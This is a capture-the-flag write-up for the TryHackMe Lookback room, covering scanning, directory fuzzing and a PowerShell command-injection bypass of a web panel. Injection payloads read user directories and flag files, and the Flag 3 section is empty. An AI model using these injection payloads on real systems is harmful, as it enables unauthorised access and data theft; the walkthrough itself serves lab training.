# 🧠 TryHackMe Room: Lookback 

**Room URL:** [https://tryhackme.com/room/lookback](https://tryhackme.com/room/lookback)  
**Author:** Schenkee  
**Profile:** [https://tryhackme.com/p/schenkee](https://tryhackme.com/p/schenkee)  

---

## 🧩 Challenge Task Overview  

**Objective:**  
This guide covers the steps required to solve all tasks in the Lookback room. The challenge involves web enumeration, command injection, and exploiting a vulnerable version of Microsoft Exchange. This room is marketed as an Active Directory room but is just one machine running as a DC with many normal DC ports being blocked, making it a bit odd to work with. At the end of the guide, I breakdown some problems I was having getting a reverse shell due to encoding issues and the resolution.  

---

## 🧰 Tools I Used  
- nmap
- ffuf
- Nikto
- Metasploit

---

Firstly, let’s start our target machine and give it a few minutes to start all relevant services. We can also either start the AttackBox or as in my case connect our own machine to the TryHackMe VPN.  

---

## 🛠️ Initial Recon & Enumeration 

To confirm the target is up and running run a TCP SYN Ping as ICMP is blocked as per the CTF intro details.

```bash
sudo nmap -PS -sn TARGET_IP
```

#### ⚙️ **Options**   
**sudo** Needed to run this command as a privileged user otherwise it will perform a 3-way-handshake.  
**-PS** Tells nmap to perform a TCP SYN ping against the target.  
**-sn** Tells nmap to perform host discovery only, no port scanning.  

This confirmed the target was up and reachable from the attacking machine.  
![Recon - nmap PS.png](./Images/Recon%20-%20nmap%20PS.png)  

Now that the target has been verified to be online. Perform a standard nmap port scan as below.  
```bash
sudo nmap -sS TARGET_IP
```

#### ⚙️ **Options**   
**sudo** Needed to run this command as a privileged user otherwise it will perform a 3-way-handshake and be a TCP Connect Scan -sT.  
**-sS** Tells nmap to perform a TCP SYN Scan.  

This returns information that 3 ports are open. 80 and 443 related to web sites and 3389 for RDP.  
![Recon - nmap small.png](./Images/Recon%20-%20nmap%20small.png)  

Now for the final nmap scan let us target these 3 ports with a version scan and nmap default scripts to try learn more specific details about each service.  
```bash
sudo nmap -sS -sV -sC TARGET_IP -p 80,443,3389
```
#### ⚙️ **Options**   
**sudo** Needed to run this command as a privileged user otherwise it will perform a 3-way-handshake and be a TCP Connect Scan -sT.  
**-sS** Tells nmap to perform a TCP SYN Scan.  
**-sV** Tells nmap to perform version scanning, which is required for running scripts.  
**-sC** Tells nmap to run default scripts against the ports.  
**-p** Tells nmap which ports to scan.  

This returns some further interesting details.  We learn that the computer is called ```WIN-12OUO7A66M7```  and is on the ```thm.local``` domain. 
![Recon - nmap big.png](./Images/Recon%20-%20nmap%20big.png)

The above found details can be added to the ```/etc/hosts``` file to allow us to navigate directly to ```http://WIN-12OUO7A66M7.thm.local```.  Open the ```etc/hosts``` file in your preferred text editor and add the line as below. This will require root privileges.  
```bash
sudo nano /etc/hosts
TARGET_IP  WIN-12OUO7A66M7.thm.local
```
Save and exit the file.  
![Recon - etc hosts.png](./Images/Recon%20-%20etc%20hosts.png)  

Now that this has been setup a quick manual check can be done on ```http://WIN-12OUO7A66M7.thm.local``` and ```https://WIN-12OUO7A66M7.thm.local```.  
Going to port ```80``` did not reveal anything other than a blank page.  
But going to port ```443``` via ```https://WIN-12OUO7A66M7.thm.local``` did reveal an Outlook login panel.
![Recon - outlook.png](./Images/Recon%20-%20outlook.png)  
This will come in handy later, but for now continue with more recon.  

Next up time for some directory enumeration.  I had first attempted to use ```gobuster``` but did not have much luck. So turned to fuff using the below command.  
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u https://WIN-12OUO7A66M7.thm.local/FUZZ -fw 1
```

#### ⚙️ **Options**   
**-w** Points ffuf to the chosen wordlist to insert into the ```FUZZ``` position.  
**-u** Provides ffuf with the target url.  
**-fw** Is used to filter the result by the number of words in the response. This is used to filter out any response with 1 word and helps reduce the returned information.  
![Recon - fuff.png](./Images/Recon%20-%20ffuf.png)  

The most interesting hit returned is on the word ```test``` which contains 30 lines and 81 words. Far higher than any other response. 
![Recon - fuff result.png](./Images/Recon%20-%20fuff%20result.png)  

When manually navigation to
```url
https://WIN-12OUO7A66M7.thm.local/test
```
A login panel pops open. This looks very promising and will be our initial access point.  
![Flag 1 - login.png](./Images/Flag%201%20-%20login.png)

To round off the recon and enumeration stage a final scan can be undertaken via Nikto. 
```bash
nikto -h https://WIN-12OUO7A66M7.thm.local
```

#### ⚙️ **Options**   
**-h** Provides Nikto with the target host or web server to be scanned.  

This takes a while to run but turns out to be very worthwhile as it is able to find the login details to the ```https://WIN-12OUO7A66M7.thm.local/test``` panel.  
![Recond - Nikto.png](./Images/Recon%20-%20Nikto.png)  
This will be our way into the target and the path to the first two flags.  

---

## 🛠️ Flag 1 

In a browser navigate to the found login panel.  
```url
https://WIN-12OUO7A66M7.thm.local/test
```
![Flag 1 - login.png](./Images/Flag%201%20-%20login.png)  

Enter the ```Username``` and ```Password``` found during the Nikto scan.  If successful login should be achieved and the first flag found.  
![Flag1 - flag.png](./Images/Flag1%20-%20flag.png)

---

## 🛠️ Flag 2

The interface presented after logging in looks like a command panel. There is already some input text and if the ```Run``` button is pressed nothing noticeable seem to happen. Remove the text and enter in ```whoami``` This returns an error, but the error message has some very useful information about how the panel handling the string entered the ```Path:``` box.  

```powershell
Get-Content : Cannot find path 'C:\whoami' because it does not exist.
At line:1 char:1
+ Get-Content('C:\whoami')
+ ~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\whoami:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
```

It appears as though the text being entered into the box is being passed to ```Get-Content``` as a string and appended to ```C:\```. It might be possible to pass a second variable.  

Enter the following into the box to try run ```whoami```  
```powershell
BitLockerActiveMonitoringLogs'); whoami; #
```  
This worked and the whoami command was processed and the result returned. We have command injection as the thm\admin user!  
![Flag 1 -whoami.png](./Images/Flag%201%20-%20whoami.png)  

This worked because ``` `)``` closes out the ```Get-Content(`...`)``` string. The ```;``` that follows lets you chain a new command which runs independently. The ```#``` at the end comments out any trailing text so the rest of the original wrapper is ignored.  



Have a look around the file system for anything interesting. I started off by outputting the contents of the ```c:\users``` directory to try identifying the users on the machine.
```powershell
BitLockerActiveMonitoringLogs'); dir c:\users; #
```
![Flag2 - users.png](./Images/Flag2%20-%20users.png)  
Here two other users are located ```dev``` and ```Administrator```

When trying to access ```Administrator``` folders a ```Access Denied``` error was returned. As such move onto the ```dev``` user.

```powershell
BitLockerActiveMonitoringLogs'); dir c:\users\dev\Desktop; #
```
Revealed two interesting looking text files.  
![Flag2 - files.png](./Images/Flag2%20-%20files.png)

Using the ```type``` command output the contents of each of the two found files.

Firstly the ```TODO.txt``` file
```powershell
BitLockerActiveMonitoringLogs'); type c:\users\dev\Desktop\TODO.txt; #
```  
![Flag2 - Todo.png](./Images/Flag2%20-%20Todo.png)  
This provides some further information. Here are three email addresses and also a mention that the MS Exchange instance requires a security update.  

Now the ```user.txt``` file
```powershell
BitLockerActiveMonitoringLogs'); type c:\users\dev\Desktop\user.txt; #
```  
![Flag2 - flag.png](./Images/Flag2%20-%20flag.png)   
Here is the second flag!  

---

## 🛠️ Flag 3



---

## 🧠 Takeaways  



---

Thank you for following through my guide of the TryHackMe Lookback room.
